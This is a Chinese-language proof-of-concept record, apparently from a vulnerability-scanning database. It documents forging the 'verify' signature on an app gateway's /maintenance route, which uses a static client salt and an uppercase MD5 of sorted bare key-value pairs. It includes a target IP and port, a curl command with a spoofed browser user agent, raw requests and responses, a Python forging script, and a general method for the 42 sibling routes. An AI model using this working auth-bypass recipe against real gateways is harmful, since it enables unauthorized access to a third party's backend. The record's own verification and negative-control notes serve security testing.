# 自研 App 网关 /maintenance 签名门可离线伪造（客户端静态盐 private_&lt;字段名&gt;，裸 key+value 升序拼接 + MD5 大写）

- **code**: app-gateway-maintenance-static-salt-signature-forge
- **kind**: poc
- **category**: auth-bypass
- **component**: 自研 App 后端网关（/maintenance 及同族 42 条 private_* 路由）
- **severity**: medium
- **language**: http
- **source**: manual
- **verified**: 1
- **verified_note**: task#614（2026-11-04T15:14Z 起，固定出口 79.168.149.210，请求间隔 3s）：对 23.224.93.242:47000 POST /maintenance，用离线复算的盐串 "private_maintenance" 生成 verify=0C19F50440BD4B045E3DF6BC9DD45AFF（channel=105001）→ HTTP 200 / Content-Length 9 / {"ret":0}，越过"参数检查失败"门；阴性对照 channel 空串（以及 k=v& 拼接、&key=salt、原始字段顺序、小写 verify 等共 6 种形态）→ 200/39B/{"ret":1,"msg":"参数检查失败！"}，证明 ret:0 是签名判定通过的结果而非无条件返回。注意本轮响应无 data.servers[]，数据面影响尚未确认。
- **path**: pocs/app-gateway-maintenance-static-salt-signature-forge/poc.http
- **tags**: auth-bypass, 签名伪造, 静态盐, md5, 客户端硬编码, maintenance, 网关, app后端, verify
- **created_at**: 2026-11-04T15:28:02.310Z
- **engine**: 23.224.93.242:47000
- **found_by**: vuln-scan

## 描述

该网关用统一的 verify 参数做"参数完整性/防篡改"校验，但签名材料全部来自客户端静态量：请求体取固定 7 字段，按 key 字典升序做「裸 key 拼裸 value」（无 = 无 &，无分隔符）后直接拼接盐字符串 "private_maintenance"，MD5 取大写。盐值等于 "private_" + 字段/路由名，同族 42 条 private_* 路由均可按同一规律猜出。因此该签名机制不构成访问控制，任何人可离线伪造任意请求。

## 用法

```
前置：目标对 curl 默认 UA 一律 403（返回 TEST-ERROR），必须伪装浏览器 UA 才放行 /maintenance；Content-Type: application/json;charset=utf-8；HTTPS 自签证书需 -k。

签名公式（本路由）：
  signstr = "".join(sorted_kv) + "private_maintenance"
  其中 sorted_kv = 对 7 个字段按 key 升序直接拼接 k+v，例如：
  channel105001deviceid0000000000000000devicetypeandroidgametype1token123type1version1.0.0.9
  verify = MD5(signstr) 的 32 位大写十六进制

复现命令：
curl.exe -k -s -i --noproxy "*" \
  -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36" \
  -H "Content-Type: application/json;charset=utf-8" \
  --data-binary '{"token":"123","version":"1.0.0.9","gametype":"1","type":"1","devicetype":"android","deviceid":"0000000000000000","channel":"105001","verify":"0C19F50440BD4B045E3DF6BC9DD45AFF"}' \
  https://<HOST>:47000/maintenance
成功判据：HTTP 200 + 9 字节 {"ret":0}
失败判据：200 + 39 字节 {"ret":1,"msg":"参数检查失败！"}

换路由时的通用打法：
1) 从客户端静态资源（APK/IPA 的 JS/托管层字符串）里搜 "verify" 的生成点与 "private_" 前缀常量；
2) 盐若等于 "private_" + 路由名，则直接按上述顺序拼接试算；
3) 必须先做阴性对照（改一个字段但不重算 verify，或清空 channel）确认为 200/{"ret":1,...}，否则 ret:0 可能是无条件返回；
4) 服务端若对字段用固定常量（而非请求里的值），把从客户端解出的常量原样填入再算。

常见失败原因：
- UA 非浏览器 → 403 TEST-ERROR（不是签名问题，别误判）；
- 拼接时加了 = 或 & → 必错，公式是裸拼；
- 未按 key 字典序（注意 devicetype < gametype < token < type < version）；
- verify 用了小写 MD5；
- 字段集合多了/少了（空串字段是否参与拼接需二叉对比确认，本路由 channel 空串会被拒）。
```

## 正文

```
## 目标与前置

- 入口：https://<HOST>:47000/maintenance （POST，JSON）
- UA 必须伪装浏览器（该主机对 curl 默认 UA 一律 403 返回 TEST-ERROR）
- Content-Type: application/json;charset=utf-8
- 自签证书需 -k / 忽略校验

## 签名算法（逆向自客户端）

```
fields  = token, version, gametype, type, devicetype, deviceid, channel
signstr = concat( for k in sorted(fields.keys()): k + value[k] ) + "private_maintenance"
verify  = MD5(signstr).upper()          # 32 位大写
```

注意：**裸 key 拼裸 value**，既没有 `=` 也没有 `&`，字段之间也无分隔符。
本路由的盐就是路由名派生出的 `private_maintenance`；同族 42 条 private_* 路由的盐均等于各自字段名，
因此整体签名机制可被完全离线复现，不构成访问控制。

本次样本：
```
signstr = channel105001deviceid0000000000000000devicetypeandroidgametype1token123type1version1.0.0.9private_maintenance
verify  = 0C19F50440BD4B045E3DF6BC9DD45AFF
```

## 正向请求（命中）

```http
POST /maintenance HTTP/1.1
Host: <HOST>:47000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Content-Type: application/json;charset=utf-8

{"token":"123","version":"1.0.0.9","gametype":"1","type":"1","devicetype":"android","deviceid":"0000000000000000","channel":"105001","verify":"0C19F50440BD4B045E3DF6BC9DD45AFF"}
```

响应：
```
HTTP/1.1 200 OK
Content-Type: application/json;charset=utf-8
Content-Length: 9

{"ret":0}
```

## 阴性对照（必须做，用于排除"无条件返回"）

同一算法、仅把 channel 置空串：
```http
POST /maintenance HTTP/1.1
Host: <HOST>:47000
Content-Type: application/json;charset=utf-8

{"token":"123","version":"1.0.0.9","gametype":"1","type":"1","devicetype":"android","deviceid":"0000000000000000","channel":"","verify":"FB7AE40BA0708E961EBD2D6F921CFE57"}
```
响应：
```
HTTP/1.1 200 OK
Content-Length: 39

{"ret":1,"msg":"参数检查失败！"}
```

另外 6 种形态全部返回同一拒绝（200/39B）：
- `k=v&` 形式拼接
- 盐以 `&key=salt` 形式追加
- 按原始字段顺序（不排序）
- verify 小写
- channel 空串（见上）
- 其余字段值改动但未重算 verify

结论：`{"ret":0}` 是签名通过后的业务层返回，不是无条件 200 内容。

## 判定口径与边界

- 成立：伪造 verify 被接受（ret:0）且阴性对照被拒（ret:1 参数检查失败）
- 本次响应中**未出现 data.servers[]**，数据面（能否真正下发/改写维护配置）未确认；
  需先用正确字段常量再复核，勿把 ret:0 直接等同于"可控制维护下发"。

## 复算脚本（python，供换值复用）

```python
import hashlib, json

def make_verify(payload: dict, salt="private_maintenance") -> str:
    items = {k: v for k, v in payload.items() if k != "verify"}
    signstr = "".join(f"{k}{items[k]}" for k in sorted(items))
    signstr += salt
    print("signstr =", signstr)
    return hashlib.md5(signstr.encode()).hexdigest().upper()

body = {"token":"123","version":"1.0.0.9","gametype":"1","type":"1",
        "devicetype":"android","deviceid":"0000000000000000","channel":"105001"}
body["verify"] = make_verify(body)
print(json.dumps(body, ensure_ascii=False))
```

```
